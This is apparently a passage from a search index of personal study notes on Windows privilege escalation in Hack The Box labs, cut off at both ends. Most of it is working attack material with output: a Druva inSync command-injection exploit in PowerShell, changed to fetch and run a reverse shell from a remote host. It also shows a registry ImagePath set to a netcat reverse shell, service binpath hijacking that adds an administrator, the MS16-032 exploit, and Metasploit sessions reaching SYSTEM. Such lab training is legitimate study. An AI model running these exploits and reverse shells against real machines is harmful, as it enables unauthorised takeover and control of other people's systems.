SeIncreaseBasePriorityPrivilege Increase scheduling priority Disabled SeCreatePagefilePrivilege Create a pagefile Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Disabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled SeCreateSymbolicLinkPrivilege Create symbolic links Disabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled","title":"User Account Control"},{"location":"windows_privesc/vulnerable_services/","text":"Start by enumerating installed applications C:\\htb> wmic product get name Name Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910 Update for Windows 10 for x64-based Systems (KB4023057) Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127 VMware Tools Druva inSync 6.6.3 Microsoft Update Health Tools Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910 Update for Windows 10 for x64-based Systems (KB4480730) Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127 The Druva inSync application stands out. A quick Google search shows that version 6.6.3 is vulnerable to a command injection attack via an exposed RPC service. We may be able to use this exploit PoC to escalate our privileges. Further enumeration to confirm that the service is running as expected: C:\\htb> netstat -ano | findstr 6064 TCP 127.0.0.1:6064 0.0.0.0:0 LISTENING 3324 TCP 127.0.0.1:6064 127.0.0.1:50274 ESTABLISHED 3324 TCP 127.0.0.1:6064 127.0.0.1:50510 TIME_WAIT 0 TCP 127.0.0.1:6064 127.0.0.1:50511 TIME_WAIT 0 TCP 127.0.0.1:50274 127.0.0.1:6064 ESTABLISHED 3860 Enumerating Process ID PS C :\\ htb > get-process -Id 3324 Handles NPM ( K ) PM ( K ) WS ( K ) CPU ( s ) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 149 10 1512 6748 3324 0 inSyncCPHwnet64 At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the Get-Service cmdlet. PS C :\\ htb > get-service | ? { $_ . DisplayName -like 'Druva*' } Status Name DisplayName ------ ---- ----------- Running inSyncCPHService Druva inSync Client Service With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet. $ErrorActionPreference = \"Stop\" $cmd = \"net user pwnd /add\" $s = New-Object System . Net . Sockets . Socket ( [System.Net.Sockets.AddressFamily] :: InterNetwork , [System.Net.Sockets.SocketType] :: Stream , [System.Net.Sockets.ProtocolType] :: Tcp ) $s . Connect ( \"127.0.0.1\" , 6064 ) $header = [System.Text.Encoding] :: UTF8 . GetBytes ( \"inSync PHC RPCW[v0002]\" ) $rpcType = [System.Text.Encoding] :: UTF8 . GetBytes ( \" $( [char] 0x0005 ) `0`0`0 \" ) $command = [System.Text.Encoding] :: Unicode . GetBytes ( \"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\" ); $length = [System.BitConverter] :: GetBytes ( $command . Length ); $s . Send ( $header ) $s . Send ( $rpcType ) $s . Send ( $length ) $s . Send ( $command ) For our purposes, we want to modify the $cmd variable to our desired command. Let's try this with Invoke-PowerShellTcp.ps1 . Rename it something simple like script.ps1 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443 Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory. $cmd = \"powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')\" Start a Python web server in the same directory as script.ps1 script hrmns@htb[/htb]$ python3 -m http.server 8080 Start a Netcat listener on the attack box and execute the PoC PowerShell script on the target host (after modifying the PowerShell execution policy with a command such as Set-ExecutionPolicy Bypass -Scope Process ) hrmns@htb[/htb]$ nc -lvnp 9443 listening on [any] 9443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611 Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01 Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\WINDOWS\\system32>whoami nt authority\\system PS C:\\WINDOWS\\system32> hostname WINLPE-WS01","title":"Vulnerable Services"},{"location":"windows_privesc/weak_permissions/","text":"Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. We need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available. We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs. PS C:\\htb> .\\SharpUp.exe audit === SharpUp: Running Privilege Escalation Checks === === Modifiable Service Binaries === Name : SecurityService DisplayName : PC Security Management Service Description : Responsible for managing PC security State : Stopped StartMode : Auto PathName : \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" <SNIP> The tool identifies the PC Security Management Service , which executes the SecurityService.exe binary when started. Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents. PS C:\\htb> icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" C:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F) Everyone:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom . It can give us a reverse shell as SYSTEM , or add a local admin user and give us full administrative control over the machine. C:\\htb> cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" C:\\htb> sc start SecurityService Let's check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured. C:\\htb> SharpUp.exe audit === SharpUp: Running Privilege Escalation Checks === === Modifiable Services === Name : WindscribeService DisplayName : WindscribeService Description : Manages the firewall and controls the VPN tunnel State : Running StartMode : Auto PathName : \"C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\" We can use AccessChk from the Sysinternals suite to enumerate permissions on the service. Flags: -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). We can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it. C:\\htb> accesschk.exe /accepteula -quvcw WindscribeService Accesschk v6.13 - Reports effective permissions for securable objects Copyright \u2310 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com WindscribeService Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS Checking the local administrators group confirms that our user is not a member. C:\\htb> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator mrb3n The command completed successfully. We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary). C:\\htb> sc config WindscribeService binpath=\"cmd /c net localgroup administrators htb-student /add\" [SC] ChangeServiceConfig SUCCESS Next, we must stop the service, so the new binpath command will run the next time it is started. C:\\htb> sc stop WindscribeService SERVICE_NAME: WindscribeService TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x4 WAIT_HINT : 0x0 Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned. The service fails to start because the binpath is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the binpath . C:\\htb> sc start WindscribeService [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Check to confirm that our user was added to the local administrators group. C:\\htb> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator htb-student mrb3n The command completed successfully. Cleanup Reverting the Binary Path C:\\htb> sc config WindScribeService binpath=\"c:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\" [SC] ChangeServiceConfig SUCCESS If all goes to plan, we can start the service again without an issue. C:\\htb> sc start WindScribeService SERVICE_NAME: WindScribeService TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PID : 1716 FLAGS : Verifying Service is Running C:\\htb> sc query WindScribeService SERVICE_NAME: WindScribeService TYPE : 10 WIN32_OWN_PROCESS STATE : 4 Running (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 Searching for Unquoted Service Paths We can identify unquoted service binary paths: C:\\htb> wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\" GVFS.Service GVFS.Service C:\\Program Files\\GVFS\\GVFS.Service.exe Auto System Explorer Service SystemExplorerHelpService C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe Auto WindscribeService WindscribeService C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe Auto It is also worth searching for weak service ACLs in the Windows Registry. C:\\htb> accesschk.exe /accepteula \"mrb3n\" -kvuqsw hklm\\System\\CurrentControlSet\\services Accesschk v6.13 - Reports effective permissions for securable objects Copyright \u2310 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com RW HKLM\\System\\CurrentControlSet\\services\\ModelManagerService KEY_ALL_ACCESS <SNIP> Changing ImagePath with PowerShell We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value, using a command such as: PS C:\\htb> Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\" Modifiable Registry Autorun Binary Check Startup Programs We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in. PS C:\\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl Name : OneDrive command : \"C:\\Users\\mrb3n\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background Location : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run User : WINLPE-WS01\\mrb3n Name : Windscribe command : \"C:\\Program Files (x86)\\Windscribe\\Windscribe.exe\" -os_restart Location : HKU\\S-1-5-21-2374636737-2633833024-1808968233-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run User : WINLPE-WS01\\mrb3n Name : SecurityHealth command : %windir%\\system32\\SecurityHealthSystray.exe Location : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run User : Public Name : VMware User Process command : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr Location : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run User : Public Name : VMware VM3DService Process command : \"C:\\WINDOWS\\system32\\vm3dservice.exe\" -u Location : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run User : Public","title":"Weak Permissions"},{"location":"windows_privesc/windows_desktop/","text":"Install Python Dependencies hrmns@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz hrmns@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz hrmns@htb[/htb]$ cd setuptools-2.0/ hrmns@htb[/htb]$ sudo python2.7 setup.py install hrmns@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz ) hrmns@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz hrmns@htb[/htb]$ cd xlrd-1.0.0/ hrmns@htb[/htb]$ sudo python2.7 setup.py install Capture the systeminfo command's output and save it to a text file C:\\htb> systeminfo Host Name: WINLPE-WIN7 OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: mrb3n Registered Organization: Product ID: 00371-222-9819843-86644 Original Install Date: 3/25/2021, 7:23:47 PM System Boot Time: 5/13/2021, 5:14:12 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows <SNIP> We then need to update our local copy of the Microsoft Vulnerability database. This command will save the contents to a local Excel file. hrmns@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update Run the tool against the vulnerability database to check for potential privilege escalation flaws. hrmns@htb[/htb]$ python2.7 windows-exploit-suggester.py --database 2021 -05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (utf-8) [*] querying database file for potential vulnerabilities [*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits [*] there are now 386 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as 'Windows 7 SP1 64-bit' [*] [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important [*] https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135) [*] https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2) [*] https://github.com/tinysec/public/tree/master/CVE-2016-7255 [*] [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important [*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) [*] [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important [*] https://github.com/foxglovesec/RottenPotato [*] https://github.com/Kevin-Robertson/Tater [*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege [*] https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation [*] [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important [*] https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC [*] https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC [*] [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical [*] https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC [*] [E] MS16-059: Security Update for Windows Media Center (3150220) - Important [*] https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC [*] [E] MS16-056: Security Update for Windows Journal (3156761) - Critical [*] https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java\u00adScript\u00adStack\u00adWalker Memory Corruption (MS15-056) [*] http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java\u00adScript\u00adStack\u00adWalker memory corruption [*] [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important [*] https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC [*] https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC [*] https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#) [*] <SNIP> [*] [M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical [M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important [M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical [M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical [M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical [M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical [M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical [M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC [*] [*] done Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this local exploit suggester module which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist. Exploiting MS16-032 with PowerShell PoC PS C:\\htb> Set-ExecutionPolicy bypass -scope process Execution Policy Change The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution policy? [Y] Yes [N] No [S] Suspend [?] Help (default is \"Y\"): A [Y] Yes [N] No [S] Suspend [?] Help (default is \"Y\"): Y PS C:\\htb> Import-Module .\\Invoke-MS16-032.ps1 PS C:\\htb> Invoke-MS16-032 __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -> @FuzzySec] [?] Operating system core count: 6 [>] Duplicating CreateProcessWithLogonW handle [?] Done, using thread handle: 1656 [*] Sniffing out privileged impersonation token.. [?] Thread belongs to: svchost [+] Thread suspended [>] Wiping current impersonation token [>] Building SYSTEM impersonation token [?] Success, open SYSTEM token handle: 1652 [+] Resuming thread.. [*] Sniffing out SYSTEM shell.. [>] Duplicating SYSTEM token [>] Starting token race [>] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! This works and we spawn a SYSTEM cmd console. C:\\htb> whoami nt authority\\system","title":"Windows Desktop"},{"location":"windows_privesc/windows_server/","text":"Querying Current Patch Level \u00b6 C:\\htb> wmic qfe Caption CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status http://support.microsoft.com/?kbid=2533552 WINLPE-2K8 Update KB2533552 WINLPE-2K8\\Administrator 3/31/2021 A quick Google search of the last installed hotfix shows us that this system is very far out of date. Running Sherlock \u00b6 PS C :\\ htb > Set-ExecutionPolicy bypass -Scope process Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic . Do you want to change the execution policy ? [Y] Yes [N] No [S] Suspend [?] Help ( default is \"Y\" ): Y PS C :\\ htb > Import-Module .\\ Sherlock . ps1 PS C :\\ htb > Find-AllVulns Title : User Mode to Ring ( KiTrap0D ) MSBulletin : MS10 - 015 CVEID : 2010 - 0232 Link : https :// www . exploit-db . com / exploits / 11199 / VulnStatus : Not supported on 64-bit systems Title : Task Scheduler . XML MSBulletin : MS10 - 092 CVEID : 2010 - 3338 , 2010 - 3888 Link : https :// www . exploit-db . com / exploits / 19930 / VulnStatus : Appears Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13 - 053 CVEID : 2013 - 1300 Link : https :// www . exploit-db . com / exploits / 33213 / VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13 - 081 CVEID : 2013 - 3881 Link : https :// www . exploit-db . com / exploits / 31576 / VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14 - 058 CVEID : 2014 - 4113 Link : https :// www . exploit-db . com / exploits / 35101 / VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15 - 051 CVEID : 2015 - 1701 , 2015 - 2433 Link : https :// www . exploit-db . com / exploits / 37367 / VulnStatus : Appears Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15 - 078 CVEID : 2015 - 2426 , 2015 - 2433 Link : https :// www . exploit-db . com / exploits / 38222 / VulnStatus : Not Vulnerable Title : 'mrxdav.sys' WebDAV MSBulletin : MS16 - 016 CVEID : 2016 - 0051 Link : https :// www . exploit-db . com / exploits / 40085 / VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16 - 032 CVEID : 2016 - 0099 Link : https :// www . exploit-db . com / exploits / 39719 / VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16 - 034 CVEID : 2016 - 0093 / 94 / 95 / 96 Link : https :// github . com / SecWiki / windows-kernel-exploits / thttps :// us-cert . cisa . gov / ncas / alerts / aa20 - 133aree / master / MS16 - 034 ? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16 - 135 CVEID : 2016 - 7255 Link : https :// github . com / FuzzySecurity / PSKernel-Primitives / tree / master / Sample-Exploits / MS16 - 135 VulnStatus : Not Vulnerable Title : Nessus Agent 6 . 6 . 2 - 6 . 10 . 3 MSBulletin : N / A CVEID : 2017 - 7199 Link : https :// aspe1337 . blogspot . co . uk / 2017 / 04 / writeup-of-cve - 2017 - 7199 . html VulnStatus : Not Vulnerable Obtaining Meterpreter Shell msf6 exploit(windows/smb/smb_delivery) > search smb_delivery Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/smb_delivery 2016-07-26 excellent No SMB Delivery Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery msf6 exploit(windows/smb/smb_delivery) > use 0 [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/smb_delivery) > show options Module options (exploit/windows/smb/smb_delivery): Name Current Setting Required Description ---- --------------- -------- ----------- FILE_NAME test.dll no DLL file name FOLDER_NAME no Folder name to share (Default none) SHARE no Share (Default Random) SRVHOST 10.10.14.3 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 445 yes The local port to listen on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.3 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 1 PSH msf6 exploit(windows/smb/smb_delivery) > show targets Exploit targets: Id Name -- ---- 0 DLL 1 PSH msf6 exploit(windows/smb/smb_delivery) > set target 0 target => 0 msf6 exploit(windows/smb/smb_delivery) > exploit [*] Exploit running as background job 1. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.14.3:4444 [*] Started service listener on 10.10.14.3:445 [*] Server started. [*] Run the following command on the target machine: rundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0 Rundll Command on Target Host C:\\htb> rundll32.exe \\\\10.10.14.3\\lEUZam\\test.dll,0 Receiving Reverse Shell msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15 [*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400 Let's search for the MS10_092 Windows Task Scheduler '.XML' Privilege Escalation module. msf6 exploit(windows/smb/smb_delivery) > search 2010-3338 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/ms10_092_schelevator 2010-09-13 excellent Yes Windows Escalate Task Scheduler XML Privilege Escalation msf6 exploit(windows/smb/smb_delivery) use 0 Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the smb_delivery step. msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1 [*] Starting interaction with 1... meterpreter > getpid Current pid: 2268 meterpreter > ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 164 1800 VMwareUser.exe x86 2 WINLPE-2K8\\htb-student C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareUser.exe 244 2032 winlogon.exe 260 4 smss.exe 288 476 svchost.exe 332 324 csrss.exe 376 324 wininit.exe 476 376 services.exe 492 376 lsass.exe 500 376 lsm.exe 584 476 mscorsvw.exe 600 476 svchost.exe 616 476 msdtc.exe 676 476 svchost.exe 744 476 taskhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\taskhost.exe 756 1800 VMwareTray.exe x86 2 WINLPE-2K8\\htb-student C:\\Program Files (x86)\\VMware\\VMware Tools\\VMwareTray.exe 764 476 svchost.exe 800 476 svchost.exe 844 476 svchost.exe 900 476 svchost.exe 940 476 svchost.exe 976 476 spoolsv.exe 1012 476 sppsvc.exe 1048 476 svchost.exe 1112 476 VMwareService.exe 1260 2460 powershell.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1408 2632 conhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\conhost.exe 1464 900 dwm.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\dwm.exe 1632 476 svchost.exe 1672 600 WmiPrvSE.exe 2140 2460 cmd.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\cmd.exe 2256 600 WmiPrvSE.exe 2264 476 mscorsvw.exe 2268 2628 rundll32.exe x86 2 WINLPE-2K8\\htb-student C:\\Windows\\SysWOW64\\rundll32.exe 2460 2656 explorer.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\explorer.exe 2632 2032 csrss.exe 2796 2632 conhost.exe x64 2 WINLPE-2K8\\htb-student C:\\Windows\\System32\\conhost.exe 2876 476 svchost.exe 3048 476 svchost.exe meterpreter > migrate 2796 [*] Migrating from 2268 to 2796... [*] Migration completed successfully. meterpreter > background [*] Backgrounding session 1... Now set up the privilege escalation module by specifying our current Meterpreter session. lhost=tun0 msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1 SESSION => 1 msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3 lhost => 10.10.14.3 msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443 lport => 4443 msf6 exploit(windows/local/ms10_092_schelevator) > show options Module options (exploit/windows/local/ms10_092_schelevator): Name Current Setting Required Description ---- --------------- -------- ----------- CMD no Command to execute instead of a payload SESSION 1 yes The session to run this module on. TASKNAME no A name for the created task (default random) Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.3 yes The listen address (an interface may be specified) LPORT 4443 yes The listen port Exploit target: Id Name -- ---- 0 Windows Vista, 7, and 2008 If all goes to plan, once we type exploit , we will receive a new Meterpreter shell as the NT AUTHORITY\\SYSTEM account and can move on to perform any necessary post-exploitation. msf6 exploit(windows/local/ms10_092_schelevator) > exploit [*] Started reverse TCP handler on 10.10.14.3:4443 [*] Preparing payload at C:\\Windows\\TEMP\\uQEcovJYYHhC.exe [*] Creating task: isqR4gw3RlxnplB [*] SUCCESS: The scheduled task \"isqR4gw3RlxnplB\" has successfully been created. [*] SCHELEVATOR [*] Reading the task file contents from C:\\Windows\\system32\\tasks\\isqR4gw3RlxnplB... [*] Original CRC32: 0x89b06d1a [*] Final CRC32: 0x89b06d1a [*] Writing our modified content back... [*] Validating task: isqR4gw3RlxnplB [*] [*] Folder: \\ [*] TaskName Next Run Time Status [*] ======================================== ====================== =============== [*] isqR4gw3RlxnplB 6/1/2021 1:04:00 PM Ready [*] SCHELEVATOR [*] Disabling the 